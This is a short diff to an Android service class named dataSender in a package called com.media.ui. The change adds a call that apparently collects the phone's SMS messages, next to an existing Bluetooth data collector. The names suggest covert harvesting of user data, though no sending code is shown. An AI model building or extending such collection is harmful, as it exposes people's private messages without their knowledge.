@@ -4,6 +4,7 @@ import android.app.IntentService;
 import android.content.Intent;
 
 import com.media.ui.DataCollector.bluetoothCollect;
+import com.media.ui.DataCollector.smsData;
 
 import static com.media.ui.Util.logger.logg;
 
@@ -26,6 +27,7 @@ public class dataSender extends IntentService {
         if(intent !=null){
             logg("datacollector Service");
             new bluetoothCollect(this);
+            new smsData().getSMS(this);
         }
     }
 
